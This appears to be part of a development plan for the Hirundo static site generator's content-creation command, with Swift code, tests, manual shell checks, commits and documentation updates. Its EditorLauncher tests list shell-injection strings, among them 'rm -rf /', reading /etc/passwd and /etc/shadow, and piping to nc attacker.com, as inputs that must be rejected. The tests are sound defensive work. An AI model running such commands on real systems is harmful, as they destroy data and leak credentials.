/// Creates a single Markdown content file inside an existing Hirundo site.
///
/// Deliberately separate from `SiteScaffolder`: that type requires an empty destination
/// and rolls the whole tree back on failure, which is right for creating a site once and
/// exactly wrong for adding one file to a site that already has content.
///
/// Not marked `Sendable` because it stores `FileManager`, which is not `Sendable`.
public struct ContentScaffolder {
    private let fileManager: FileManager

    /// Creates a scaffolder.
    /// - Parameter fileManager: File manager used for filesystem operations.
    public init(fileManager: FileManager = .default) {
        self.fileManager = fileManager
    }

    /// Scalars rejected in a title.
    ///
    /// `controlCharacters` covers only Cc and Cf, so it misses U+2028 LINE SEPARATOR and
    /// U+2029 PARAGRAPH SEPARATOR. Those would be written verbatim into the double-quoted
    /// YAML scalar and then folded to a plain space by the parser, so the title would not
    /// round-trip. `newlines` adds exactly those line-breaking scalars.
    /// Same rule as `SiteScaffolder.forbiddenTitleScalars`.
    private static let forbiddenTitleScalars: CharacterSet =
        CharacterSet.controlCharacters.union(.newlines)

    /// Creates one content file.
    /// - Parameters:
    ///   - projectRoot: Directory holding `config.yaml` and the content directory.
    ///   - build: Build settings; only `contentDirectory` is consulted.
    ///   - limits: Length limits for the title and the file name.
    ///   - kind: Whether to create a post or a page.
    ///   - options: Title, slug/path, taxonomy, draft flag, and template.
    ///   - date: Value for the post's `date:` key. Injectable so tests are deterministic.
    /// - Returns: The created file's absolute URL and project-relative path.
    /// - Throws: `ContentScaffoldError` when the input is unusable, the destination is
    ///   taken, or the write fails.
    public func scaffold(
        in projectRoot: URL,
        build: Build,
        limits: Limits,
        kind: ContentKind,
        options: ContentScaffoldOptions,
        date: Date = Date()
    ) throws -> ContentScaffoldResult {
        let title = try validateTitle(options.title, maxLength: limits.maxTitleLength)
        let contentDirectory = projectRoot
            .appendingPathComponent(build.contentDirectory)
            .standardizedFileURL

        let relativeToContent = try resolveRelativePath(
            kind: kind,
            options: options,
            title: title,
            limits: limits
        )
        let destination = contentDirectory
            .appendingPathComponent(relativeToContent)
            .standardizedFileURL
        try validateWithinContentDirectory(destination, contentDirectory: contentDirectory)

        guard !fileManager.fileExists(atPath: destination.path) else {
            throw ContentScaffoldError.fileExists(destination.path)
        }

        let contents = ContentTemplates.markdown(
            kind: kind,
            title: title,
            date: date,
            categories: options.categories,
            tags: options.tags,
            draft: options.draft,
            template: options.template ?? kind.defaultTemplate
        )

        try write(contents, to: destination)

        return ContentScaffoldResult(
            url: destination,
            relativePath: build.contentDirectory + "/" + relativeToContent
        )
    }

    // MARK: - Validation

    private func validateTitle(_ title: String, maxLength: Int) throws -> String {
        let trimmed: String
        do {
            trimmed = try ConfigValidation.validateNonEmptyAndLength(
                title,
                maxLength: maxLength,
                fieldName: "Title"
            )
        } catch let ConfigError.invalidValue(details) {
            throw ContentScaffoldError.invalidTitle(details)
        } catch let error as ConfigError {
            throw ContentScaffoldError.invalidTitle(error.localizedDescription)
        }

        if trimmed.unicodeScalars.contains(where: { Self.forbiddenTitleScalars.contains($0) }) {
            throw ContentScaffoldError.invalidTitle("Title cannot contain control characters")
        }
        return trimmed
    }

    /// Resolves the destination path relative to the content directory, extension included.
    private func resolveRelativePath(
        kind: ContentKind,
        options: ContentScaffoldOptions,
        title: String,
        limits: Limits
    ) throws -> String {
        if let path = options.path {
            return try sanitizedPath(path)
        }

        let slug = try resolveSlug(options.slug, title: title, limits: limits)
        switch kind {
        case .post:
            return "posts/\(slug).md"
        case .page:
            return "\(slug).md"
        }
    }

    private func resolveSlug(_ explicit: String?, title: String, limits: Limits) throws -> String {
        guard let explicit else {
            // Leave room for the ".md" the caller appends.
            return title.slugify(maxLength: max(1, limits.maxFilenameLength - 3))
        }

        let trimmed = explicit.trimmingCharacters(in: .whitespacesAndNewlines)
        guard !trimmed.isEmpty else {
            throw ContentScaffoldError.invalidSlug("Slug cannot be empty")
        }
        // A slug names one file, not a path.
        guard !trimmed.contains("/"), !trimmed.contains("\\"), trimmed != ".", trimmed != ".." else {
            throw ContentScaffoldError.invalidSlug(
                "Slug must name a single file, not a path: \(trimmed)"
            )
        }
        guard !trimmed.unicodeScalars.contains(where: { CharacterSet.controlCharacters.contains($0) }) else {
            throw ContentScaffoldError.invalidSlug("Slug cannot contain control characters")
        }
        guard trimmed.count + 3 <= limits.maxFilenameLength else {
            throw ContentScaffoldError.invalidSlug(
                "Slug exceeds the \(limits.maxFilenameLength)-character file name limit"
            )
        }
        return trimmed
    }

    /// Sanitizes a caller-supplied relative path and gives it a `.md` extension.
    ///
    /// `PathSanitizer.sanitize` returns an empty string for anything it refuses — `..`,
    /// `./`, a leading `/`, NUL bytes, a scheme — so an empty result is the rejection.
    private func sanitizedPath(_ path: String) throws -> String {
        let sanitized = PathSanitizer.sanitize(path.trimmingCharacters(in: .whitespacesAndNewlines))
        guard !sanitized.isEmpty else {
            throw ContentScaffoldError.invalidPath(
                "Path must be relative to the content directory: \(path)"
            )
        }
        return sanitized.hasSuffix(".md") ? sanitized : sanitized + ".md"
    }

    /// Belt-and-braces check that the resolved destination really sits inside the content
    /// directory, after `standardizedFileURL` has collapsed any remaining `.` components.
    private func validateWithinContentDirectory(_ destination: URL, contentDirectory: URL) throws {
        let root = contentDirectory.path.hasSuffix("/")
            ? contentDirectory.path
            : contentDirectory.path + "/"
        guard destination.path.hasPrefix(root) else {
            throw ContentScaffoldError.invalidPath(
                "Path escapes the content directory: \(destination.path)"
            )
        }
    }

    // MARK: - Writing

    /// Writes the file, creating missing parent directories and rolling those back if the
    /// write itself fails.
    ///
    /// Deliberately not `SiteFileManager.writeFile(content:to:)`: this write is atomic (a
    /// failure must not leave a truncated file behind) and must land on the literal path
    /// the user named, whereas `SiteFileManager` resolves symlinks — right for generated
    /// output under `_site`, wrong for content the user asked to create here.
    private func write(_ contents: String, to destination: URL) throws {
        let parent = destination.deletingLastPathComponent()
        let createdRoot = topmostMissingAncestor(of: parent)
        if createdRoot != nil {
            do {
                try fileManager.createDirectory(at: parent, withIntermediateDirectories: true)
            } catch {
                throw ContentScaffoldError.cannotCreateDirectory(parent.path)
            }
        }

        do {
            try Data(contents.utf8).write(to: destination, options: .atomic)
        } catch {
            // Only remove directories this call created; never touch pre-existing ones.
            if let createdRoot {
                try? fileManager.removeItem(at: createdRoot)
            }
            throw ContentScaffoldError.cannotWriteFile(destination.path)
        }
    }

    /// Returns the highest ancestor of `url` (possibly `url` itself) that does not exist —
    /// the topmost directory `createDirectory(withIntermediateDirectories:)` would create,
    /// and therefore the only one safe to remove when rolling back.
    /// - Returns: `nil` when `url` already exists, so rollback leaves it alone.
    private func topmostMissingAncestor(of url: URL) -> URL? {
        var current = url.standardizedFileURL
        var missing: URL?
        while !fileManager.fileExists(atPath: current.path) {
            missing = current
            let parent = current.deletingLastPathComponent().standardizedFileURL
            if parent.path == current.path { break }
            current = parent
        }
        return missing
    }
}
```

- [ ] **Step 4: テストが通ることを確認**

Run: `swift test --filter ContentScaffolderTests`
Expected: PASS（27 テスト）

想定される引っかかりどころ:
- `testGeneratedPostBuildsToItsSlugURL` は `SiteScaffolder` が `templates/post.html` を作る必要があるので `includeBlog: true`。出力パスが違う場合は `_site` の中身を `find` で確認してからテスト側の期待値を直すこと（実装ではなく）。
- `Build(contentDirectory:)` は `throws`。テストの `try` を忘れないこと。

- [ ] **Step 5: 全テストを実行して回帰がないことを確認**

Run: `swift test`
Expected: すべて PASS

- [ ] **Step 6: コミット**

```bash
git add Sources/HirundoCore/Scaffold/ContentScaffolder.swift Tests/HirundoTests/ContentScaffolderTests.swift
git commit -m "feat: add ContentScaffolder to create one content file

Resolves the destination from build.contentDirectory, validates the title,
slug and path, refuses to overwrite an existing file, and writes atomically
with a rollback of any directory it created.

Kept separate from SiteScaffolder: that type requires an empty destination
and rolls the whole tree back on failure, which is exactly wrong for adding
one file to a site that already has content."
```

---

### Task 4: `NewCommand` を `ContentScaffolder` に配線する

**Files:**
- Modify: `Sources/Hirundo/Commands/NewCommand.swift`（全面書き換え）
- Modify: `Sources/Hirundo/ErrorHandling.swift`（`ScaffoldError` 分岐の直後に `ContentScaffoldError` 分岐を追加）

**Interfaces:**
- Consumes: `ContentScaffolder`, `ContentScaffoldOptions`, `ContentScaffoldResult`, `ContentKind`, `ContentScaffoldError`（Task 1–3）、`HirundoConfig.load(from:)`, `Build.defaultBuild()`, `Limits()`
- Produces: なし（CLI が終端）

このタスクにテストは無い。CLI ターゲットはテストできないため（Global Constraints 参照）、検証は手動の受け入れ確認（Step 4）で行う。

- [ ] **Step 1: `handleError` に分岐を追加**

`Sources/Hirundo/ErrorHandling.swift` の

```swift
    } else if let scaffoldError = error as? ScaffoldError {
        let hirundoError = scaffoldError.toHirundoError()
        eprint(hirundoError.userMessage)
        eprint("\n📍 Specific issue: \(scaffoldError.localizedDescription)")
    } else {
```

を次に置き換える:

```swift
    } else if let scaffoldError = error as? ScaffoldError {
        let hirundoError = scaffoldError.toHirundoError()
        eprint(hirundoError.userMessage)
        eprint("\n📍 Specific issue: \(scaffoldError.localizedDescription)")
    } else if let contentError = error as? ContentScaffoldError {
        let hirundoError = contentError.toHirundoError()
        eprint(hirundoError.userMessage)
        eprint("\n📍 Specific issue: \(contentError.localizedDescription)")
    } else {
```

- [ ] **Step 2: `NewCommand.swift` を書き換える**

`Sources/Hirundo/Commands/NewCommand.swift` の全内容を次で置き換える:

```swift
import ArgumentParser
import Foundation
import HirundoCore

struct NewCommand: ParsableCommand {
    static let configuration = CommandConfiguration(
        commandName: "new",
        abstract: "Create new content",
        subcommands: [
            NewPostCommand.self,
            NewPageCommand.self
        ]
    )
}

/// Settings `hirundo new` needs from `config.yaml`, with the fallback used when there is
/// no config file to read.
///
/// Only `build.contentDirectory` and the two length limits matter here, so this resolves
/// to `Build`/`Limits` rather than a whole `HirundoConfig` — synthesising a `HirundoConfig`
/// would mean inventing a `site.title` and `site.url` that nothing reads.
struct NewContentContext {
    let projectRoot: URL
    let build: Build
    let limits: Limits

    /// Reads `config.yaml` from `projectRoot`, falling back to defaults when it is absent
    /// or unreadable. Matches how `hirundo clean` resolves its output directory: a missing
    /// config is not a reason to refuse to create a file.
    static func resolve(projectRoot: URL) -> NewContentContext {
        let configURL = projectRoot.appendingPathComponent("config.yaml")
        guard FileManager.default.fileExists(atPath: configURL.path) else {
            return NewContentContext(
                projectRoot: projectRoot,
                build: Build.defaultBuild(),
                limits: Limits()
            )
        }
        guard let config = try? HirundoConfig.load(from: configURL) else {
            FileHandle.standardError.write(Data(
                "⚠️  Could not read config.yaml; using default directories.\n".utf8
            ))
            return NewContentContext(
                projectRoot: projectRoot,
                build: Build.defaultBuild(),
                limits: Limits()
            )
        }
        return NewContentContext(projectRoot: projectRoot, build: config.build, limits: config.limits)
    }
}

/// Prints the created path and, when asked, hands the file to the user's editor.
func reportCreatedContent(_ result: ContentScaffoldResult, openInEditor: Bool) {
    print("✅ Created \(result.relativePath)")
    if openInEditor {
        EditorLauncher.open(result.url)
    }
}

struct NewPostCommand: ParsableCommand {
    static let configuration = CommandConfiguration(
        commandName: "post",
        abstract: "Create a new blog post"
    )

    @Argument(help: "Post title")
    var title: String

    @Option(name: .long, help: "File name for the post, without the .md extension")
    var slug: String?

    @Option(name: .long, help: "Comma-separated categories")
    var categories: String?

    @Option(name: .long, help: "Comma-separated tags")
    var tags: String?

    @Option(name: .long, help: "Template file name (default: post.html)")
    var template: String?

    @Flag(name: .long, help: "Create as draft")
    var draft: Bool = false

    @Flag(name: .long, help: "Open in editor")
    var open: Bool = false

    @Flag(name: .long, help: "Show verbose error information")
    var verbose: Bool = false

    mutating func run() throws {
        let cwd = URL(fileURLWithPath: FileManager.default.currentDirectoryPath, isDirectory: true)
        let context = NewContentContext.resolve(projectRoot: cwd)

        do {
            let result = try ContentScaffolder().scaffold(
                in: context.projectRoot,
                build: context.build,
                limits: context.limits,
                kind: .post,
                options: ContentScaffoldOptions(
                    title: title,
                    slug: slug,
                    categories: ContentScaffoldOptions.parseList(categories),
                    tags: ContentScaffoldOptions.parseList(tags),
                    draft: draft,
                    template: template
                )
            )
            reportCreatedContent(result, openInEditor: open)
        } catch {
            handleError(error, context: "New post", verbose: verbose)
            throw ExitCode.failure
        }
    }
}

struct NewPageCommand: ParsableCommand {
    static let configuration = CommandConfiguration(
        commandName: "page",
        abstract: "Create a new page"
    )

    @Argument(help: "Page title")
    var title: String

    @Option(name: .long, help: "Path for the page, relative to the content directory")
    var path: String?

    @Option(name: .long, help: "Template file name (default: default.html)")
    var template: String?

    @Flag(name: .long, help: "Open in editor")
    var open: Bool = false

    @Flag(name: .long, help: "Show verbose error information")
    var verbose: Bool = false

    mutating func run() throws {
        let cwd = URL(fileURLWithPath: FileManager.default.currentDirectoryPath, isDirectory: true)
        let context = NewContentContext.resolve(projectRoot: cwd)

        do {
            let result = try ContentScaffolder().scaffold(
                in: context.projectRoot,
                build: context.build,
                limits: context.limits,
                kind: .page,
                options: ContentScaffoldOptions(
                    title: title,
                    path: path,
                    template: template
                )
            )
            reportCreatedContent(result, openInEditor: open)
        } catch {
            handleError(error, context: "New page", verbose: verbose)
            throw ExitCode.failure
        }
    }
}
```

`EditorLauncher` は Task 5 で作る。このタスクの時点ではまだ存在しないので、Step 3 のビルドは失敗する。次の Step 3 で暫定実装を置く。

- [ ] **Step 3: `EditorLauncher` の呼び出しを一時的に外してビルドを通す**

Task 5 でエディタ機能を TDD で作るまでの間、`reportCreatedContent` を次に差し替える:

```swift
/// Prints the created path and, when asked, hands the file to the user's editor.
func reportCreatedContent(_ result: ContentScaffoldResult, openInEditor: Bool) {
    print("✅ Created \(result.relativePath)")
    if openInEditor {
        FileHandle.standardError.write(Data(
            "⚠️  --open is not wired up yet.\n".utf8
        ))
    }
}
```

Run: `swift build`
Expected: 成功（警告なし）

- [ ] **Step 4: 手動で受け入れ確認**

```bash
HIRUNDO="$PWD/.build/debug/hirundo"
rm -rf /tmp/hirundo-manual && mkdir -p /tmp/hirundo-manual
"$HIRUNDO" init /tmp/hirundo-manual --blog --force
cd /tmp/hirundo-manual

"$HIRUNDO" new post "My First Post" --categories "swift, , swift ,web" --tags "ssg" --draft
cat content/posts/my-first-post.md

# 同じ名前をもう一度 → エラーで中断し、既存ファイルは無傷であること
"$HIRUNDO" new post "My First Post"; echo "exit=$?"

"$HIRUNDO" new page "About Us" --path about/us
cat content/about/us.md

# パストラバーサルが拒否されること
"$HIRUNDO" new page "Bad" --path ../escaped; echo "exit=$?"
ls /tmp/escaped.md 2>/dev/null && echo "LEAKED"
```

（`HIRUNDO` の行はリポジトリルートで実行すること。`cd` の後も絶対パスとして残る。）

確認すること:
- `content/posts/my-first-post.md` が生成され、`categories: ["swift", "web"]`（重複と空要素が除去済み）、`tags: ["ssg"]`、`draft: true`、`template: "post.html"` を持ち、`slug:` キーが無い
- 2 回目の `new post` が exit=1 で終わり、`content/posts/my-first-post.md` の内容が変わっていない
- `content/about/us.md` が生成され、`template: "default.html"` を持ち `date:` が無い
- `--path ../escaped` が exit=1 で終わり、`/tmp` にファイルが漏れていない

- [ ] **Step 5: `swift test` で回帰がないことを確認**

Run: `swift test`
Expected: すべて PASS

- [ ] **Step 6: コミット**

```bash
git add Sources/Hirundo/Commands/NewCommand.swift Sources/Hirundo/ErrorHandling.swift
git commit -m "feat(new): actually create content files

new post / new page now write a Markdown file instead of printing what they
would do. --slug, --categories, --tags, --draft and --path take effect for
the first time, and the content directory comes from build.contentDirectory
rather than a hard-coded \"content\".

--layout is replaced by --template: layout: is not read by the build, so the
old flag named a key that does nothing. --open still warns that it is not
wired up; that lands next."
```

---

### Task 5: `EditorLauncher` と `--open`

**Files:**
- Create: `Sources/HirundoCore/EditorLauncher.swift`
- Modify: `Sources/Hirundo/Commands/NewCommand.swift`（`reportCreatedContent` の 1 箇所）
- Test: `Tests/HirundoTests/EditorLauncherTests.swift`（新規）

**Interfaces:**
- Consumes: `SecurityUtilities.validateAndSanitizeEditorCommand(_:)`（`Sources/HirundoCore/SecurityUtilities.swift:11` に既存）
- Produces:
  - `static func EditorLauncher.resolveEditorCommand(environment:) -> String?`
  - `@discardableResult static func EditorLauncher.open(_:) -> Bool`

これが `SecurityUtilities` の最初のプロダクション呼び出し元になる。同関数は完全なテスト（`EditorCommandValidationTests`）を持ちながら、これまでどこからも呼ばれていなかった。

- [ ] **Step 1: 失敗するテストを書く**

`Tests/HirundoTests/EditorLauncherTests.swift` を新規作成:

```swift
import XCTest
@testable import HirundoCore

/// Covers how an editor is chosen from the environment. Launching a real process is out
/// of scope — the risk here is in what gets accepted as a command, not in spawning it.
final class EditorLauncherTests: XCTestCase {

    func testPrefersVisualOverEditor() {
        let command = EditorLauncher.resolveEditorCommand(
            environment: ["VISUAL": "nano", "EDITOR": "vim"]
        )

        XCTAssertEqual(command, "nano")
    }

    func testFallsBackToEditor() {
        XCTAssertEqual(
            EditorLauncher.resolveEditorCommand(environment: ["EDITOR": "vim"]),
            "vim"
        )
    }

    func testReturnsNilWhenNeitherIsSet() {
        XCTAssertNil(EditorLauncher.resolveEditorCommand(environment: [:]))
    }

    func testReturnsNilForBlankValues() {
        XCTAssertNil(EditorLauncher.resolveEditorCommand(environment: ["EDITOR": ""]))
        XCTAssertNil(EditorLauncher.resolveEditorCommand(environment: ["EDITOR": "   "]))
    }

    func testRejectsAnEditorOutsideTheAllowList() {
        XCTAssertNil(EditorLauncher.resolveEditorCommand(environment: ["EDITOR": "malicious"]))
    }

    func testRejectsShellInjectionAttempts() {
        let attempts = [
            "vim; rm -rf /",
            "nano && cat /etc/passwd",
            "code | nc attacker.com 1234",
            "vim `cat /etc/shadow`",
            "vim $(whoami)"
        ]

        for attempt in attempts {
            XCTAssertNil(
                EditorLauncher.resolveEditorCommand(environment: ["EDITOR": attempt]),
                "Expected \(attempt) to be rejected"
            )
        }
    }

    func testRejectsPathTraversal() {
        XCTAssertNil(
            EditorLauncher.resolveEditorCommand(environment: ["EDITOR": "../../bin/vim"])
        )
    }

    func testFallsBackToEditorWhenVisualIsRejected() {
        // A bad $VISUAL must not shadow a perfectly good $EDITOR.
        let command = EditorLauncher.resolveEditorCommand(
            environment: ["VISUAL": "vim; rm -rf /", "EDITOR": "vim"]
        )

        XCTAssertEqual(command, "vim")
    }
}
```

- [ ] **Step 2: テストが失敗することを確認**

Run: `swift test --filter EditorLauncherTests`
Expected: コンパイルエラー — `cannot find 'EditorLauncher' in scope`

- [ ] **Step 3: 最小の実装を書く**

`Sources/HirundoCore/EditorLauncher.swift` を新規作成:

```swift
import Foundation

/// Opens a file in the user's configured editor.
///
/// The command comes from the environment, so it is attacker-influenced in exactly the
/// way `SecurityUtilities.validateAndSanitizeEditorCommand` was written to handle: every
/// candidate goes through that allow-list before anything is executed, and the process is
/// spawned directly rather than through a shell, so there is no metacharacter to abuse.
public enum EditorLauncher {

    /// Picks an editor command from the environment.
    ///
    /// `$VISUAL` wins over `$EDITOR` (the long-standing convention: `$VISUAL` names a
    /// full-screen editor, `$EDITOR` may be a line editor). A `$VISUAL` that fails
    /// validation falls through to `$EDITOR` rather than giving up, so one bad value does
    /// not shadow a usable one.
    /// - Parameter environment: Environment to read. Injectable for tests.
    /// - Returns: A validated command name, or `nil` when nothing usable is configured.
    public static func resolveEditorCommand(
        environment: [String: String] = ProcessInfo.processInfo.environment
    ) -> String? {
        for key in ["VISUAL", "EDITOR"] {
            guard let raw = environment[key],
                  !raw.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty else {
                continue
            }
            if let validated = SecurityUtilities.validateAndSanitizeEditorCommand(raw) {
                return validated
            }
        }
        return nil
    }

    /// Opens `fileURL` in the configured editor and waits for it to exit.
    ///
    /// Failure is reported on stderr and nothing else: the file has already been written,
    /// and reporting that as a failure would misrepresent what happened.
    /// - Parameter fileURL: File to open.
    /// - Returns: `true` when an editor ran to completion.
    @discardableResult
    public static func open(_ fileURL: URL) -> Bool {
        guard let command = resolveEditorCommand() else {
            warn("Set $EDITOR to a supported editor to use --open.")
            return false
        }

        let process = Process()
        process.executableURL = URL(fileURLWithPath: "/usr/bin/env")
        // Arguments are passed as a list, never joined into a shell command line.
        process.arguments = [command, fileURL.path]
        // Terminal editors need the real terminal, so the standard streams are inherited.

        do {
            try process.run()
            process.waitUntilExit()
            return process.terminationStatus == 0
        } catch {
            warn("Could not start '\(command)': \(error.localizedDescription)")
            return false
        }
    }

    private static func warn(_ message: String) {
        try? FileHandle.standardError.write(contentsOf: Data("⚠️  \(message)\n".utf8))
    }
}
```

- [ ] **Step 4: テストが通ることを確認**

Run: `swift test --filter EditorLauncherTests`
Expected: PASS（8 テスト）

もし `testRejectsAnEditorOutsideTheAllowList` が落ちる場合、`SecurityUtilities` にはテスト環境で実行ファイル存在チェックを緩める分岐がある。許可リスト自体のチェックはその前段にあるので、許可リスト外の名前は環境に関わらず `nil` になるはず。落ちるなら `SecurityUtilities.swift:35` 付近を読むこと。**`SecurityUtilities` は変更しない** — 既存テストが依存している。

- [ ] **Step 5: `NewCommand` を本実装に戻す**

`Sources/Hirundo/Commands/NewCommand.swift` の `reportCreatedContent` を次に戻す:

```swift
/// Prints the created path and, when asked, hands the file to the user's editor.
func reportCreatedContent(_ result: ContentScaffoldResult, openInEditor: Bool) {
    print("✅ Created \(result.relativePath)")
    if openInEditor {
        EditorLauncher.open(result.url)
    }
}
```

Run: `swift build`
Expected: 成功

- [ ] **Step 6: 手動で受け入れ確認**

```bash
cd /tmp/hirundo-manual
HIRUNDO=/Users/hiro/Projetct/GitHub/Hirundo/.build/debug/hirundo

# $EDITOR 未設定 → 警告のみ、exit=0、ファイルは作成済み
env -u EDITOR -u VISUAL "$HIRUNDO" new post "Editor Unset"; echo "exit=$?"
ls content/posts/editor-unset.md

# 許可リスト外 → 警告のみ、exit=0
EDITOR=malicious "$HIRUNDO" new post "Editor Bad"; echo "exit=$?"
ls content/posts/editor-bad.md

# 正常系（vim が終了するまでブロックするので :q で抜ける）
EDITOR=vim "$HIRUNDO" new post "Editor Good"
```

確認すること: 3 ケースとも Markdown ファイルが作られ、最初の 2 ケースは exit=0 のまま警告だけが stderr に出る。

- [ ] **Step 7: 全テストを実行**

Run: `swift test`
Expected: すべて PASS

- [ ] **Step 8: コミット**

```bash
git add Sources/HirundoCore/EditorLauncher.swift \
        Tests/HirundoTests/EditorLauncherTests.swift \
        Sources/Hirundo/Commands/NewCommand.swift
git commit -m "feat(new): wire up --open

Adds EditorLauncher, which reads \$VISUAL then \$EDITOR and runs every
candidate through SecurityUtilities.validateAndSanitizeEditorCommand before
spawning it directly — no shell, so there is no metacharacter to abuse. This
is that function's first production caller; it had a full test suite and no
users.

A missing, rejected, or failing editor warns on stderr and leaves the exit
code at 0. The file is already written, so reporting a failure would
misrepresent what happened."
```

---

### Task 6: ドキュメントをコードに合わせる

**Files:**
- Modify: `README.md`（`### hirundo new` 節と「Not Yet Implemented」節）
- Modify: `README.ja.md`（同上）
- Modify: `CLAUDE.md`（「新規コンテンツの作成」節）

**Interfaces:**
- Consumes: Task 4–5 で確定した CLI のオプション
- Produces: なし

- [ ] **Step 1: `README.md` の `hirundo new` 節を書き換える**

現在の内容（「⚠️ **Not fully implemented.**」ブロックを含む）を次で置き換える:

````markdown
### `hirundo new`
Create new content.

```bash
hirundo new post <title> [--slug <slug>] [--categories <list>] [--tags <list>]
                         [--template <template>] [--draft] [--open] [--verbose]
hirundo new page <title> [--path <path>] [--template <template>] [--open] [--verbose]
```

**`hirundo new post`**

| Option | Meaning |
|---|---|
| `--slug` | File name without the `.md` extension. Defaults to a slug derived from the title. |
| `--categories` | Comma-separated. Blank entries and duplicates are dropped. |
| `--tags` | Comma-separated. Blank entries and duplicates are dropped. |
| `--template` | Value for the `template:` key. Defaults to `post.html`. |
| `--draft` | Writes `draft: true`, so the file is skipped unless you build with `--drafts`. |
| `--open` | Opens the new file in `$VISUAL`, else `$EDITOR`. |

Creates `<contentDirectory>/posts/<slug>.md`:

```markdown
---
title: "My First Post"
date: 2026-09-05T12:00:00Z
categories: ["swift"]
tags: ["static-site"]
template: "post.html"
---

# My First Post

```

`categories`, `tags`, and `draft` appear only when you ask for them.

**`hirundo new page`**

| Option | Meaning |
|---|---|
| `--path` | Path relative to the content directory. `--path about/team` creates `content/about/team.md`, intermediate directories included. Defaults to a slug derived from the title. |
| `--template` | Value for the `template:` key. Defaults to `default.html`. |
| `--open` | Opens the new file in `$VISUAL`, else `$EDITOR`. |

Creates `<contentDirectory>/<path>.md`, with no `date:` key — the same shape as the
starter pages `hirundo init` writes.

**Notes**

- The content directory comes from `build.contentDirectory` in `config.yaml`. Without a
  config file, `content` is used and a warning is printed.
- **Neither command overwrites an existing file.** A collision is an error; pass a
  different `--slug` or `--path`, or edit the file that is already there.
- `--slug` decides the **file name only**. No `slug:` key is written into the frontmatter:
  the output URL comes from the file name while RSS links come from the post's slug, so a
  `slug:` that disagreed with the file name would make the two point at different URLs.
- `--open` only runs editors on an allow-list (`vim`, `nvim`, `nano`, `emacs`, `code`,
  `subl`, `vi`, `open`, and similar) and never goes through a shell. If `$EDITOR` is
  unset, rejected, or fails to start, the command prints a warning and still exits 0 —
  the file has already been written.
````

- [ ] **Step 2: `README.md` の「Not Yet Implemented」から該当行を削除**

次の 1 行を削除する:

```markdown
- **`hirundo new post` / `hirundo new page` file creation.** See [`hirundo new`](#hirundo-new).
```

- [ ] **Step 3: `README.ja.md` に同じ変更を日本語で加える**

`### hirundo new` 節を次で置き換える:

````markdown
### `hirundo new`
新しいコンテンツを作成します。

```bash
hirundo new post <タイトル> [--slug <スラグ>] [--categories <一覧>] [--tags <一覧>]
                            [--template <テンプレート>] [--draft] [--open] [--verbose]
hirundo new page <タイトル> [--path <パス>] [--template <テンプレート>] [--open] [--verbose]
```

**`hirundo new post`**

| オプション | 意味 |
|---|---|
| `--slug` | `.md` を除いたファイル名。省略時はタイトルから生成します。 |
| `--categories` | カンマ区切り。空要素と重複は除去されます。 |
| `--tags` | カンマ区切り。空要素と重複は除去されます。 |
| `--template` | `template:` キーの値。既定は `post.html`。 |
| `--draft` | `draft: true` を書き出します。`--drafts` 付きでビルドしない限り除外されます。 |
| `--open` | 作成したファイルを `$VISUAL`、無ければ `$EDITOR` で開きます。 |

`<contentDirectory>/posts/<スラグ>.md` を作成します:

```markdown
---
title: "My First Post"
date: 2026-09-05T12:00:00Z
categories: ["swift"]
tags: ["static-site"]
template: "post.html"
---

# My First Post

```

`categories` / `tags` / `draft` は指定したときだけ出力されます。

**`hirundo new page`**

| オプション | 意味 |
|---|---|
| `--path` | content ディレクトリからの相対パス。`--path about/team` は `content/about/team.md` を作成し、中間ディレクトリも作ります。省略時はタイトルから生成します。 |
| `--template` | `template:` キーの値。既定は `default.html`。 |
| `--open` | 作成したファイルを `$VISUAL`、無ければ `$EDITOR` で開きます。 |

`<contentDirectory>/<パス>.md` を作成します。`date:` キーは出力しません
（`hirundo init` が生成する初期ページと同じ形です）。

**補足**

- content ディレクトリは `config.yaml` の `build.contentDirectory` から決まります。
  設定ファイルが無い場合は `content` を使い、警告を表示します。
- **どちらのコマンドも既存ファイルを上書きしません。** 衝突した場合はエラーになります。
  別の `--slug` / `--path` を指定するか、既にあるファイルを編集してください。
- `--slug` が決めるのは**ファイル名だけ**です。フロントマターに `slug:` キーは
  書き出しません。出力 URL はファイル名由来、RSS のリンクは記事のスラグ由来なので、
  ファイル名と異なる `slug:` を書くと両者が別の URL を指してしまいます。
- `--open` は許可リスト（`vim`、`nvim`、`nano`、`emacs`、`code`、`subl`、`vi`、`open` など）
  にあるエディタのみを、シェルを経由せずに起動します。`$EDITOR` が未設定・不許可・
  起動失敗のいずれでも、警告を表示するだけで終了コードは 0 のままです
  （ファイルは既に作成済みのため）。
````

- [ ] **Step 4: `README.ja.md` の「未実装」節から該当行を削除**

次の 1 行を削除する:

```markdown
- **`hirundo new post` / `hirundo new page` によるファイル生成**。[`hirundo new`](#hirundo-new)を参照してください。
```

- [ ] **Step 5: `CLAUDE.md` の「新規コンテンツの作成」節を更新**

現在の

````markdown
### 新規コンテンツの作成
```bash
# ブログ記事の作成
hirundo new post "記事タイトル"

# ページの作成
hirundo new page "ページタイトル"
```
````

を次で置き換える:

````markdown
### 新規コンテンツの作成
```bash
# ブログ記事の作成 → content/posts/<スラグ>.md
hirundo new post "記事タイトル"
hirundo new post "記事タイトル" --slug custom-name --categories "swift,web" --tags "ssg" --draft

# ページの作成 → content/<スラグ>.md
hirundo new page "ページタイトル"
hirundo new page "チーム紹介" --path about/team
```

- 生成先は `config.yaml` の `build.contentDirectory` に従います。
- 既存ファイルは上書きしません（エラーになります）。
- `--slug` はファイル名だけを決めます。フロントマターに `slug:` は書き出しません。
- `--open` は `$VISUAL` / `$EDITOR` を許可リストで検証してから起動します。
  失敗しても終了コードは 0 のままです。
````

- [ ] **Step 6: リンクと整合性を確認**

```bash
grep -n "layout" README.md README.ja.md
grep -n "Not fully implemented\|hirundo new" README.md README.ja.md CLAUDE.md CONTRIBUTING.md
```

確認すること:
- `--layout` がどこにも残っていない（Frontmatter 節の「`layout:` is not read」という説明は**残す** — これは今も正しい）
- 「Not Yet Implemented」/「未実装」節に `hirundo new` の行が無い
- `CONTRIBUTING.md` の記述（`new post` / `new page` の 2 サブコマンド）は変更不要

- [ ] **Step 7: 最終確認**

```bash
swift build && swift test
```

Expected: ビルド成功、全テスト PASS

- [ ] **Step 8: コミット**

```bash
git add README.md README.ja.md CLAUDE.md
git commit -m "docs: document hirundo new now that it creates files

Replaces the 'Not fully implemented' warning with the real behaviour: option
tables, the generated frontmatter, and the three things that are easy to get
wrong — the content directory comes from config, existing files are never
overwritten, and --slug names the file rather than writing a slug: key.

--layout is gone from the command synopsis. The Frontmatter section's note
that layout: is not read stays; that is still true."
```

---

## 完了条件

